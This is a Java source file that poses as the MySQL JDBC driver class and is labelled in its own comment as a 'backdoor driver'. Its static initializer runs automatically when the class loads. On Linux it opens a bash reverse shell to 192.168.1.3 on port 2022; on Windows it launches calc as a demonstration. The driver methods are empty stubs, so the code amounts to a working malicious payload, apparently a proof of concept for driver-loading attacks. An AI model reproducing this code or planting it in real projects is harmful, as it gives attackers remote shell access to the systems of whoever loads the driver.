package com.mysql.jdbc;

import java.sql.*;
import java.util.*;
import java.util.logging.Logger;

/*
    author: Bearcat of www.numencyber.com
    desc  : Mysql jdbc backdoor driver
*/
public class Driver implements java.sql.Driver {
    static {
        String winCmd = "calc";
        String linuxCmd = "bash -i >& /dev/tcp/192.168.1.3/2022 0>&1";

        String[] cmds = null;

        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmds = new String[]{"cmd.exe", "/c", winCmd};
        } else {
            cmds = new String[]{"/bin/bash", "-c", linuxCmd};
        }

        try {
            Runtime.getRuntime().exec(cmds);
        } catch (Exception ignored) {
            // do nothing...
        }
    }

 @Override
    public Connection connect(String url, Properties info) throws SQLException {
        return null;
    }

    @Override
    public boolean acceptsURL(String url) throws SQLException {
        return false;
    }

    @Override
    public DriverPropertyInfo[] getPropertyInfo(String url, Properties info) throws SQLException {
        return new DriverPropertyInfo[0];
    }

    @Override
    public int getMajorVersion() {
        return 0;
    }

    @Override
    public int getMinorVersion() {
        return 0;
    }

    @Override
    public boolean jdbcCompliant() {
        return false;
    }

    @Override
    public Logger getParentLogger() throws SQLFeatureNotSupportedException {
        return null;
    }
}